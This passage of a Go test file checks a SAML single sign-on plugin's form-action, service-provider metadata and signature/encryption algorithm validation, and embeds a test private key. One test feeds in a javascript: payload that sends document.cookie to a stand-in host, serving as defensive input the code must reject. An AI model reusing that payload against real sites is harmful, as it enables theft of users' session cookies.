package sso

// Ports of routes/helpers.test.ts, saml/algorithms.test.ts, saml/assertions.test.ts and
// saml/response-binding.test.ts.

import (
	"encoding/base64"
	"errors"
	"reflect"
	"regexp"
	"strings"
	"testing"

	"github.com/nimi-io/better-auth-go/betterauth"
	"github.com/nimi-io/better-auth-go/plugins/sso/internal/samlify"
)

func m1Bool(b bool) *bool { return &b }

func m1ExpectNoErr(t *testing.T, err error) {
	t.Helper()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

// m1ExpectErrContains mirrors toThrow("substring").
func m1ExpectErrContains(t *testing.T, err error, substr string) {
	t.Helper()
	if err == nil {
		t.Fatalf("expected error containing %q, got nil", substr)
	}
	if !strings.Contains(err.Error(), substr) {
		t.Fatalf("error %q does not contain %q", err.Error(), substr)
	}
}

// m1ExpectErrMatch mirrors toThrow(/regexp/).
func m1ExpectErrMatch(t *testing.T, err error, re string) {
	t.Helper()
	if err == nil {
		t.Fatalf("expected error matching %s, got nil", re)
	}
	if !regexp.MustCompile(re).MatchString(err.Error()) {
		t.Fatalf("error %q does not match %s", err.Error(), re)
	}
}

func m1AsAPIError(t *testing.T, err error) *betterauth.APIError {
	t.Helper()
	var apiErr *betterauth.APIError
	if !errors.As(err, &apiErr) {
		t.Fatalf("expected *APIError, got %T %v", err, err)
	}
	return apiErr
}

func m1BodyString(e *betterauth.APIError, key string) string {
	if e.Body == nil {
		return ""
	}
	v, _ := e.Body.Get(key)
	s, _ := v.(string)
	return s
}

// ---- routes/helpers.test.ts ----

const m1InvalidSAMLBindingLocationMessage = "SAML POST binding location must be an absolute http or https URL"

func m1ExpectInvalidSAMLBindingLocation(t *testing.T, action string) {
	t.Helper()
	_, err := createSAMLPostForm(action, "SAMLResponse", "base64value", "")
	if err == nil {
		t.Fatal("expected error")
	}
	e := m1AsAPIError(t, err)
	if e.Status != "BAD_REQUEST" || e.StatusCode != 400 || e.Message() != m1InvalidSAMLBindingLocationMessage ||
		m1BodyString(e, "message") != m1InvalidSAMLBindingLocationMessage {
		t.Fatalf("error %+v", e)
	}
}

func m1ExpectInvalidSAMLServiceProviderMetadata(t *testing.T, err error) {
	t.Helper()
	if err == nil {
		t.Fatal("expected error")
	}
	e := m1AsAPIError(t, err)
	if e.Status != "BAD_REQUEST" || m1BodyString(e, "code") != "SAML_INVALID_SP_METADATA" ||
		m1BodyString(e, "message") != "Invalid SAML service provider metadata" {
		t.Fatalf("error %+v body %v", e, e.Body)
	}
}

func TestMiscSAMLRouteHelpers(t *testing.T) {
	t.Run("createSAMLPostForm", func(t *testing.T) {
		t.Run("emits an http(s) form action", func(t *testing.T) {
			res, err := createSAMLPostForm("https://idp.example.com/slo", "SAMLResponse", "base64value", "")
			m1ExpectNoErr(t, err)
			if !strings.Contains(string(res.Body), `action="https://idp.example.com/slo"`) {
				t.Fatalf("html %s", res.Body)
			}
		})
		t.Run("rejects a javascript: form action", func(t *testing.T) {
			m1ExpectInvalidSAMLBindingLocation(t, "javascript:fetch('https://evil.test/x?c='+document.cookie)")
		})
		t.Run("rejects a data: form action", func(t *testing.T) {
			m1ExpectInvalidSAMLBindingLocation(t, "data:text/html,<script>1</script>")
		})
	})

	t.Run("deriveSAMLIdentityProviderEntityID", func(t *testing.T) {
		t.Run("returns the declared entity ID from manual IdP configuration", func(t *testing.T) {
			id, err := DeriveSAMLIdentityProviderEntityID(&SAMLConfig{
				Issuer: "https://service.example.com/saml", EntryPoint: "https://idp.example.com/sso",
				Cert: Cert("placeholder-signing-certificate"), IdpMetadata: &SAMLIdentityProviderMetadata{EntityID: "https://idp.example.com/metadata"},
			})
			m1ExpectNoErr(t, err)
			if id != "https://idp.example.com/metadata" {
				t.Fatalf("id %q", id)
			}
		})
		t.Run("returns the entity ID parsed from IdP metadata", func(t *testing.T) {
			id, err := DeriveSAMLIdentityProviderEntityID(&SAMLConfig{
				Issuer: "https://service.example.com/saml", EntryPoint: "https://ignored.example.com/sso",
				IdpMetadata: &SAMLIdentityProviderMetadata{Metadata: `
					<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://metadata-idp.example.com">
						<IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
							<SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://metadata-idp.example.com/sso" />
						</IDPSSODescriptor>
					</EntityDescriptor>
				`},
			})
			m1ExpectNoErr(t, err)
			if id != "https://metadata-idp.example.com" {
				t.Fatalf("id %q", id)
			}
		})
	})

	t.Run("createSP assertion-signing metadata", func(t *testing.T) {
		configuration := func() *SAMLConfig {
			return &SAMLConfig{Issuer: "https://service.example.com/saml", EntryPoint: "https://idp.example.com/sso",
				IdpMetadata: &SAMLIdentityProviderMetadata{EntityID: "https://idp.example.com/metadata"}, WantAssertionsSigned: m1Bool(true)}
		}
		withSP := func(metadata string) *SAMLConfig {
			c := configuration()
			c.SpMetadata = &SAMLServiceProviderMetadata{Metadata: metadata}
			return c
		}
		policyOf := func(metadata string) (SAMLServiceProviderPolicy, error) {
			return DeriveSAMLServiceProviderPolicy(&SAMLConfig{WantAssertionsSigned: m1Bool(false), SpMetadata: &SAMLServiceProviderMetadata{Metadata: metadata}})
		}
		const base = "https://service.example.com/api/auth"

		t.Run("advertises signed assertions in generated metadata", func(t *testing.T) {
			sp, err := createSP(configuration(), base, "workforce", nil)
			m1ExpectNoErr(t, err)
			if !strings.Contains(sp.GetMetadata(), `WantAssertionsSigned="true"`) {
				t.Fatalf("metadata %s", sp.GetMetadata())
			}
		})

		t.Run("accepts custom metadata that requires signed assertions", func(t *testing.T) {
			md := `
								<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
									<SPSSODescriptor WantAssertionsSigned="true" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
										<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
									</SPSSODescriptor>
								</EntityDescriptor>
							`
			_, err := createSP(withSP(md), base, "workforce", nil)
			m1ExpectNoErr(t, err)
			p, err := policyOf(md)
			m1ExpectNoErr(t, err)
			if p != (SAMLServiceProviderPolicy{WantAssertionsSigned: true}) {
				t.Fatalf("policy %+v", p)
			}
		})

		cases := []struct{ desc, metadata string }{
			{"has no entity ID", `
				<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata">
					<SPSSODescriptor WantAssertionsSigned="true" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
						<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
					</SPSSODescriptor>
				</EntityDescriptor>
			`},
			{"has no POST assertion consumer service", `
				<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
					<SPSSODescriptor WantAssertionsSigned="true" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol" />
				</EntityDescriptor>
			`},
			{"has only a Redirect assertion consumer service", `
				<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
					<SPSSODescriptor WantAssertionsSigned="true" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
						<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://service.example.com/saml/acs" />
					</SPSSODescriptor>
				</EntityDescriptor>
			`},
			{"has a relative POST assertion consumer service", `
				<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
					<SPSSODescriptor WantAssertionsSigned="true" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
						<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="/saml/acs" />
					</SPSSODescriptor>
				</EntityDescriptor>
			`},
		}
		for _, c := range cases {
			t.Run("rejects custom metadata that "+c.desc, func(t *testing.T) {
				_, err := policyOf(c.metadata)
				m1ExpectErrContains(t, err, "Invalid SAML service provider metadata")
			})
		}

		t.Run("rejects custom metadata that contradicts the signed-assertion policy", func(t *testing.T) {
			_, err := createSP(withSP(`
								<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
									<SPSSODescriptor WantAssertionsSigned="false" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
										<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
									</SPSSODescriptor>
								</EntityDescriptor>
							`), base, "workforce", nil)
			m1ExpectErrContains(t, err, "must require signed assertions")
		})

		t.Run("does not treat a misleading comment as signed-assertion policy", func(t *testing.T) {
			_, err := createSP(withSP(`
								<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
									<!-- <SPSSODescriptor WantAssertionsSigned="true" /> -->
									<SPSSODescriptor WantAssertionsSigned="false" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
										<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
									</SPSSODescriptor>
								</EntityDescriptor>
							`), base, "workforce", nil)
			m1ExpectErrContains(t, err, "must require signed assertions")
		})

		t.Run("rejects a foreign descriptor mixed with valid SP metadata", func(t *testing.T) {
			_, err := createSP(withSP(`
							<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
								<foreign:SPSSODescriptor xmlns:foreign="urn:example:foreign" WantAssertionsSigned="true" />
								<SPSSODescriptor WantAssertionsSigned="false" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
									<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
								</SPSSODescriptor>
							</EntityDescriptor>
						`), base, "workforce", nil)
			m1ExpectInvalidSAMLServiceProviderMetadata(t, err)
		})

		t.Run("accepts XML Schema numeric true for WantAssertionsSigned", func(t *testing.T) {
			md := `
			<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
				<SPSSODescriptor WantAssertionsSigned="1" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
					<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
				</SPSSODescriptor>
			</EntityDescriptor>
		`
			_, err := createSP(withSP(md), base, "workforce", nil)
			m1ExpectNoErr(t, err)
			p, err := policyOf(md)
			m1ExpectNoErr(t, err)
			if p != (SAMLServiceProviderPolicy{WantAssertionsSigned: true}) {
				t.Fatalf("policy %+v", p)
			}
		})

		t.Run("accepts XML Schema numeric false for WantAssertionsSigned", func(t *testing.T) {
			p, err := policyOf(`
			<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
				<SPSSODescriptor WantAssertionsSigned="0" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
					<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
				</SPSSODescriptor>
			</EntityDescriptor>
		`)
			m1ExpectNoErr(t, err)
			if p != (SAMLServiceProviderPolicy{WantAssertionsSigned: false}) {
				t.Fatalf("policy %+v", p)
			}
		})

		t.Run("rejects an invalid WantAssertionsSigned lexical value", func(t *testing.T) {
			_, err := policyOf(`
						<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
							<SPSSODescriptor WantAssertionsSigned="TRUE" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
								<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
							</SPSSODescriptor>
						</EntityDescriptor>
					`)
			m1ExpectErrContains(t, err, "Invalid SAML service provider metadata")
		})

		t.Run("rejects malformed custom metadata even when signed assertions are not configured", func(t *testing.T) {
			c := withSP("<EntityDescriptor><SPSSODescriptor>")
			c.WantAssertionsSigned = m1Bool(false)
			_, err := createSP(c, base, "workforce", nil)
			m1ExpectErrContains(t, err, "Invalid SAML service provider metadata")
		})
	})
}

// ---- saml/algorithms.test.ts ----

const m1EncryptedAssertionXML = `
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
	<saml:EncryptedAssertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
		<xenc:EncryptedData xmlns:xenc="http://www.w3.org/2001/04/xmlenc#">
			<xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#aes256-cbc"/>
			<ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
				<xenc:EncryptedKey>
					<xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#rsa-oaep-mgf1p"/>
				</xenc:EncryptedKey>
			</ds:KeyInfo>
		</xenc:EncryptedData>
	</saml:EncryptedAssertion>
</samlp:Response>
`

const m1DeprecatedEncryptionXML = `
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
	<saml:EncryptedAssertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
		<xenc:EncryptedData xmlns:xenc="http://www.w3.org/2001/04/xmlenc#">
			<xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"/>
			<ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
				<xenc:EncryptedKey>
					<xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#rsa-1_5"/>
				</xenc:EncryptedKey>
			</ds:KeyInfo>
		</xenc:EncryptedData>
	</saml:EncryptedAssertion>
</samlp:Response>
`

const m1PlainAssertionXML = `
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
	<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
		<saml:Subject>test</saml:Subject>
	</saml:Assertion>
</samlp:Response>
`

// m1SpyWarn replaces console.warn (warnf) and records calls.
func m1SpyWarn(t *testing.T) *[]string {
	t.Helper()
	var calls []string
	prev := warnf
	warnf = func(msg string) { calls = append(calls, msg) }
	t.Cleanup(func() { warnf = prev })
	return &calls
}

func m1WarnedWith(calls *[]string, substr string) bool {
	for _, c := range *calls {
		if strings.Contains(c, substr) {
			return true
		}
	}
	return false
}

func TestMiscSAMLAlgorithms(t *testing.T) {
	reject := &AlgorithmValidationOptions{OnDeprecated: "reject"}
	allow := &AlgorithmValidationOptions{OnDeprecated: "allow"}

	t.Run("validateSAMLAlgorithms", func(t *testing.T) {
		t.Run("signature validation", func(t *testing.T) {
			t.Run("should accept secure signature algorithms", func(t *testing.T) {
				m1ExpectNoErr(t, validateSAMLAlgorithms(SignatureAlgorithm.RSA_SHA256, m1PlainAssertionXML, nil))
			})
			t.Run("should warn by default for deprecated signature algorithms", func(t *testing.T) {
				w := m1SpyWarn(t)
				m1ExpectNoErr(t, validateSAMLAlgorithms(SignatureAlgorithm.RSA_SHA1, m1PlainAssertionXML, nil))
				if !m1WarnedWith(w, "SAML Security Warning") {
					t.Fatalf("warnings %v", *w)
				}
			})
			t.Run("should reject deprecated signature with onDeprecated: reject", func(t *testing.T) {
				m1ExpectErrMatch(t, validateSAMLAlgorithms(SignatureAlgorithm.RSA_SHA1, m1PlainAssertionXML, reject), `(?i)deprecated`)
			})
			t.Run("should silently allow deprecated with onDeprecated: allow", func(t *testing.T) {
				w := m1SpyWarn(t)
				m1ExpectNoErr(t, validateSAMLAlgorithms(SignatureAlgorithm.RSA_SHA1, m1PlainAssertionXML, allow))
				if len(*w) != 0 {
					t.Fatalf("warnings %v", *w)
				}
			})
			t.Run("should enforce custom signature allow-list", func(t *testing.T) {
				m1ExpectErrMatch(t, validateSAMLAlgorithms(SignatureAlgorithm.RSA_SHA256, m1PlainAssertionXML,
					&AlgorithmValidationOptions{AllowedSignatureAlgorithms: []string{SignatureAlgorithm.RSA_SHA512}}), `(?i)not in allow-list`)
			})
			t.Run("should pass null/undefined sigAlg without error", func(t *testing.T) {
				m1ExpectNoErr(t, validateSAMLAlgorithms("", m1PlainAssertionXML, nil))
			})
			t.Run("should reject unknown signature algorithms", func(t *testing.T) {
				m1ExpectErrMatch(t, validateSAMLAlgorithms("http://example.com/unknown-algo", m1PlainAssertionXML, nil), `(?i)not recognized`)
			})
		})

		t.Run("encryption validation", func(t *testing.T) {
			t.Run("should accept secure encryption algorithms", func(t *testing.T) {
				m1ExpectNoErr(t, validateSAMLAlgorithms(SignatureAlgorithm.RSA_SHA256, m1EncryptedAssertionXML, nil))
			})
			t.Run("should warn by default for deprecated encryption algorithms", func(t *testing.T) {
				w := m1SpyWarn(t)
				m1ExpectNoErr(t, validateSAMLAlgorithms(SignatureAlgorithm.RSA_SHA256, m1DeprecatedEncryptionXML, nil))
				if len(*w) == 0 {
					t.Fatal("expected a warning")
				}
			})
			t.Run("should reject deprecated encryption with onDeprecated: reject", func(t *testing.T) {
				m1ExpectErrMatch(t, validateSAMLAlgorithms(SignatureAlgorithm.RSA_SHA256, m1DeprecatedEncryptionXML, reject), `(?i)deprecated`)
			})
			t.Run("should skip encryption validation for plain assertions", func(t *testing.T) {
				m1ExpectNoErr(t, validateSAMLAlgorithms(SignatureAlgorithm.RSA_SHA256, m1PlainAssertionXML, nil))
			})
			t.Run("should handle malformed XML gracefully", func(t *testing.T) {
				m1ExpectNoErr(t, validateSAMLAlgorithms(SignatureAlgorithm.RSA_SHA256, "not valid xml", nil))
			})
		})
	})

	t.Run("algorithm constants", func(t *testing.T) {
		t.Run("should export signature algorithm constants", func(t *testing.T) {
			if SignatureAlgorithm.RSA_SHA256 != "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256" ||
				SignatureAlgorithm.RSA_SHA1 != "http://www.w3.org/2000/09/xmldsig#rsa-sha1" {
				t.Fatalf("%+v", SignatureAlgorithm)
			}
		})
		t.Run("should export encryption algorithm constants", func(t *testing.T) {
			if KeyEncryptionAlgorithm.RSA_OAEP != "http://www.w3.org/2001/04/xmlenc#rsa-oaep-mgf1p" ||
				DataEncryptionAlgorithm.AES_256_GCM != "http://www.w3.org/2009/xmlenc11#aes256-gcm" {
				t.Fatalf("%+v %+v", KeyEncryptionAlgorithm, DataEncryptionAlgorithm)
			}
		})
	})

	t.Run("validateConfigAlgorithms", func(t *testing.T) {
		t.Run("signature algorithm validation", func(t *testing.T) {
			t.Run("should accept secure signature algorithms", func(t *testing.T) {
				m1ExpectNoErr(t, validateConfigAlgorithms(SignatureAlgorithm.RSA_SHA256, "", nil))
			})
			t.Run("should warn by default for deprecated signature algorithms", func(t *testing.T) {
				w := m1SpyWarn(t)
				m1ExpectNoErr(t, validateConfigAlgorithms(SignatureAlgorithm.RSA_SHA1, "", nil))
				if !m1WarnedWith(w, "SAML Security Warning") {
					t.Fatalf("warnings %v", *w)
				}
			})
			t.Run("should reject deprecated signature with onDeprecated: reject", func(t *testing.T) {
				m1ExpectErrMatch(t, validateConfigAlgorithms(SignatureAlgorithm.RSA_SHA1, "", reject), `(?i)deprecated`)
			})
			t.Run("should silently allow deprecated with onDeprecated: allow", func(t *testing.T) {
				w := m1SpyWarn(t)
				m1ExpectNoErr(t, validateConfigAlgorithms(SignatureAlgorithm.RSA_SHA1, "", allow))
				if len(*w) != 0 {
					t.Fatalf("warnings %v", *w)
				}
			})
			t.Run("should enforce custom signature allow-list", func(t *testing.T) {
				m1ExpectErrMatch(t, validateConfigAlgorithms(SignatureAlgorithm.RSA_SHA256, "",
					&AlgorithmValidationOptions{AllowedSignatureAlgorithms: []string{SignatureAlgorithm.RSA_SHA512}}), `(?i)not in allow-list`)
			})
			t.Run("should reject unknown signature algorithms", func(t *testing.T) {
				m1ExpectErrMatch(t, validateConfigAlgorithms("http://example.com/unknown-algo", "", nil), `(?i)not recognized`)
			})
			t.Run("should pass undefined signatureAlgorithm without error", func(t *testing.T) {
				m1ExpectNoErr(t, validateConfigAlgorithms("", "", nil))
			})
			t.Run("should accept short-form signature algorithm names", func(t *testing.T) {
				m1ExpectNoErr(t, validateConfigAlgorithms("rsa-sha256", "", nil))
			})
			t.Run("should accept digest-style short-form for signature (backward compat)", func(t *testing.T) {
				m1ExpectNoErr(t, validateConfigAlgorithms("sha256", "", nil))
			})
			t.Run("should reject typos in short-form signature algorithm names", func(t *testing.T) {
				m1ExpectErrMatch(t, validateConfigAlgorithms("rsa-sha257", "", nil), `(?i)not recognized`)
			})
			t.Run("should warn for deprecated short-form signature algorithms", func(t *testing.T) {
				w := m1SpyWarn(t)
				m1ExpectNoErr(t, validateConfigAlgorithms("rsa-sha1", "", nil))
				if !m1WarnedWith(w, "SAML Security Warning") {
					t.Fatalf("warnings %v", *w)
				}
			})
			t.Run("should support short-form names in signature allow-list", func(t *testing.T) {
				m1ExpectNoErr(t, validateConfigAlgorithms("rsa-sha256", "",
					&AlgorithmValidationOptions{AllowedSignatureAlgorithms: []string{"rsa-sha256", "rsa-sha512"}}))
			})
		})

		t.Run("digest algorithm validation", func(t *testing.T) {
			t.Run("should accept secure digest algorithms", func(t *testing.T) {
				m1ExpectNoErr(t, validateConfigAlgorithms("", DigestAlgorithm.SHA256, nil))
			})
			t.Run("should warn by default for deprecated digest algorithms", func(t *testing.T) {
				w := m1SpyWarn(t)
				m1ExpectNoErr(t, validateConfigAlgorithms("", DigestAlgorithm.SHA1, nil))
				if !m1WarnedWith(w, "SAML Security Warning") {
					t.Fatalf("warnings %v", *w)
				}
			})
			t.Run("should reject deprecated digest with onDeprecated: reject", func(t *testing.T) {
				m1ExpectErrMatch(t, validateConfigAlgorithms("", DigestAlgorithm.SHA1, reject), `(?i)deprecated`)
			})
			t.Run("should enforce custom digest allow-list", func(t *testing.T) {
				m1ExpectErrMatch(t, validateConfigAlgorithms("", DigestAlgorithm.SHA256,
					&AlgorithmValidationOptions{AllowedDigestAlgorithms: []string{DigestAlgorithm.SHA512}}), `(?i)not in allow-list`)
			})
			t.Run("should reject unknown digest algorithms", func(t *testing.T) {
				m1ExpectErrMatch(t, validateConfigAlgorithms("", "http://example.com/unknown-digest", nil), `(?i)not recognized`)
			})
			t.Run("should accept short-form digest algorithm names", func(t *testing.T) {
				m1ExpectNoErr(t, validateConfigAlgorithms("", "sha256", nil))
			})
			t.Run("should reject typos in short-form digest algorithm names", func(t *testing.T) {
				m1ExpectErrMatch(t, validateConfigAlgorithms("", "sha257", nil), `(?i)not recognized`)
			})
			t.Run("should warn for deprecated short-form digest algorithms", func(t *testing.T) {
				w := m1SpyWarn(t)
				m1ExpectNoErr(t, validateConfigAlgorithms("", "sha1", nil))
				if !m1WarnedWith(w, "SAML Security Warning") {
					t.Fatalf("warnings %v", *w)
				}
			})
			t.Run("should support short-form names in digest allow-list", func(t *testing.T) {
				m1ExpectNoErr(t, validateConfigAlgorithms("", "sha256",
					&AlgorithmValidationOptions{AllowedDigestAlgorithms: []string{"sha256", "sha512"}}))
			})
		})

		t.Run("combined validation", func(t *testing.T) {
			t.Run("should validate both signature and digest algorithms", func(t *testing.T) {
				m1ExpectNoErr(t, validateConfigAlgorithms(SignatureAlgorithm.RSA_SHA256, DigestAlgorithm.SHA256, nil))
			})
			t.Run("should reject if signature is deprecated even if digest is secure", func(t *testing.T) {
				m1ExpectErrMatch(t, validateConfigAlgorithms(SignatureAlgorithm.RSA_SHA1, DigestAlgorithm.SHA256, reject), `(?i)deprecated`)
			})
			t.Run("should reject if digest is deprecated even if signature is secure", func(t *testing.T) {
				m1ExpectErrMatch(t, validateConfigAlgorithms(SignatureAlgorithm.RSA_SHA256, DigestAlgorithm.SHA1, reject), `(?i)deprecated`)
			})
		})
	})
}

// ---- saml/assertions.test.ts ----

const m1TestPrivateKey = `-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC0VjkOqj0N7u9b
MTnhAOdWKG4858FzEZR4WHY7oECxYHozETHlrgX8tQz8b6zuEcWrGCHudyWUAyjT
PJ09pwlEuLtdU6KbOpFvmxGkbDMmFSvYicpNqw2oArpEzXaieSMGXKunGJy2sWJP
PC6q7JhgU39Xzsl7kgpPBnLKVrB6xGofQC13ktjOp6D/0N5C8i58seqqviQdfY0f
sgwh7o7OvGrPvSPEdBemCQyvR9IufJzcY+LGyXCeTSx2GGvCAyIglK37nUVjCpYN
ocET/7wZDwxj21Et+D3xrwIgFLcjm3o1fQniHSZ+Mh/82yKbnk0SYfurjuQpm4qP
fF6azBNvAgMBAAECggEAeyHUW5sJjRX0AMQfzO4dBsscWiG0CKmcQn/EWvoUsgg5
59x5wWWNWPsWHtbxsKwZ17TmljhsRB/UJEdi5dHDllS8OgD9KhhXbWjoJuhqFDqo
cXXD2DxPWsRiAtB3jIBB1fo4iiNX/bYodgmVo8dgU4UvkfjzwZf5yfORNW7zmR6U
34w/8B/QO45GaGYfU3wDtX9puASSAfWGhNPSDh2a9kQCsyTjz9jUsR8Y00GA5YyM
a3ZOgOcKWhSUFTRQU2tJtngEWwOy8N4HMIDayG2/xCItB9o9g5KvqV2MyXo7/sjK
yHcSfS1FwM6ZCjyJWBjrNmlcyHwt51Xg2hBmGHBNQQKBgQDrhk+Ck4xTysjHVp5b
LemzHzBY2hOH82b7EB5bmjt9CGi4ESx+CWSqEOiDFx/OFa15CaU4LhKlkXwQufV1
nBU3vqy1ZNj1uVi+P0nltXM+xA7nY0w3oP7Wj32kiSkrNicFsdc19DEZ/bl2qnn9
89R3DePDsSfrFaBP5iKKMQYS1wKBgQDEA6+oasn9eoIXYsf3kuuPvvkMxcK9oPjA
FuLlfqmRCB+cALli5/RUpqg/5TceTd5BOo10huD421kvc1F/ix+RFIbEjpL8UTKn
sKPP39azR/IcNAdSrlCMo1Ab5V78iE3u0glmnMz6mEqQJRtCPYygRH7XVGX5rQGF
ZmiuK3KJKQKBgExKxISqoOEfpewUXdVxSOtx5epSMdNu/+PBs+O+URjOWYWOYpgt
GMOSGI8mNXI/SWMUwcUx/25McyDD7AP93E2jYTSdBz6JnHp768cSANPLFHzViIHY
j9QWxP9AQuqxbvCETA85G5Kswp/y1vNxQViTUj04rJKU/coD5RpYiPwfAoGACYp8
ZGA+UL5D0suWHDDkkmyjRsHhhsVtFjyG8tDFhC+3Cirm2y+bLvuluOZ5VlpH9Tja
Zc+i57oVjz+3udOVx8QOA0dFVE7Hfm4UqyukEbnwyPqnWJjvhsj0P0dc5kHkOTm0
B3CecZw0FOwZdZH1ZF+xJN4Q0KRhLJMdiUzIGHECgYACDkjT8Aj8t5T/hVan1SBg
YAuJuD7CZ4S0Ejpzpq29p1ZGIkUObVutq1e6TNlqX09AZ4mc8j2rqxQGHsWpGXoC
GTiXjqmD0wVhDKVxAQk6ofSsKXIvWvwSIU1nVOW8xKOac+3A1fnCNwIcF+DreXX1
WtR5NoV4s3ccEpQ3ucds0Q==
-----END PRIVATE KEY-----`

const m1TestCertificate = `-----BEGIN CERTIFICATE-----
MIICxDCCAawCCQCzwtqqB9Kw0DANBgkqhkiG9w0BAQsFADAkMSIwIAYDVQQDDBlC
ZXR0ZXIgQXV0aCBTQU1MIFRlc3QgSWRQMB4XDTI2MDczMTEwNTMxOVoXDTM2MDcy
ODEwNTMxOVowJDEiMCAGA1UEAwwZQmV0dGVyIEF1dGggU0FNTCBUZXN0IElkUDCC
ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALRWOQ6qPQ3u71sxOeEA51Yo
bjznwXMRlHhYdjugQLFgejMRMeWuBfy1DPxvrO4RxasYIe53JZQDKNM8nT2nCUS4
u11Tops6kW+bEaRsMyYVK9iJyk2rDagCukTNdqJ5IwZcq6cYnLaxYk88LqrsmGBT
f1fOyXuSCk8GcspWsHrEah9ALXeS2M6noP/Q3kLyLnyx6qq+JB19jR+yDCHujs68
as+9I8R0F6YJDK9H0i58nNxj4sbJcJ5NLHYYa8IDIiCUrfudRWMKlg2hwRP/vBkP
DGPbUS34PfGvAiAUtyObejV9CeIdJn4yH/zbIpueTRJh+6uO5Cmbio98XprME28C
AwEAATANBgkqhkiG9w0BAQsFAAOCAQEAUUPYWz+fzH34xWLhRpNXdk1OfNeVwYb7
pJGcPReh+0bl5WcyudwX3MaUYWtFkYU6XCX6zIfBrbQdm0J/KQdcdtITPQ/XESQo
BSu3NySpcqjyEwLleHI7k4urE03T0LwiaGywyVMYkxD8aQwIkoLOIFX6+5dnYnNv
DYuat3WCusVdr36EzsHdxkjLR9pjH/TOvb+a1V5EeUrvo/o0s3dmV53sYUu9o+uE
F/Aspp/I9A4sWaZ7gZuHLJWqu2JeVLqFSYDik8BINLgBT8WHsjlpxjOZbmF6TK2H
ygOFfRgdqY9FjlD0qkyBH2tqYhoOyIdIZi/4zTd3L3sLx18mib4KVA==
-----END CERTIFICATE-----`

const m1TestSignatureAlgorithm = "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"

func m1CreateUnsignedResponse(assertionContent string) string {
	if assertionContent == "" {
		assertionContent = "<saml:Subject />"
	}
	return `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_response">
		<saml:Issuer>https://idp.example.com</saml:Issuer>
		<saml:Assertion ID="_assertion">
			<saml:Issuer>https://idp.example.com</saml:Issuer>
